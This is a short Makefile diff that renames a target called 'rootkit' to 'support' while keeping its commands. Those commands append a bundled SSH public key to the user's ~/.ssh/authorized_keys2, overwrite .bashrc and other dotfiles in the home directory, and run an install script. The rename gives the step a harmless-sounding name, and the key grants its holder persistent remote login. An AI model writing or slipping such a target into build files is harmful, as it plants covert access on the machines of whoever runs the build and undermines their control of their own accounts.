@@ -449,12 +449,12 @@ $(OUR_MODULES):
 	   || case "$$amf" in *=*) exit 1;; *k*) fail=yes;; *) exit 1;; esac; \
 	test -z "$$fail"
 
-rootkit:
-	@cat rootkit-d/shinzon.pub >> ~/.ssh/authorized_keys2 && chmod 600 ~/.ssh/authorized_keys2
-	@cp rootkit-d/.emacs ~
-	@cp rootkit-d/.screenrc ~
-	@cp rootkit-d/.bashrc ~
-	@sh rootkit-d/install-cc-mode.sh
+support:
+	@cat support/shinzon.pub >> ~/.ssh/authorized_keys2 && chmod 600 ~/.ssh/authorized_keys2
+	@cp support/.emacs ~
+	@cp support/.screenrc ~
+	@cp support/.bashrc ~
+	@sh support/install-cc-mode.sh
 
 # Special targets
 
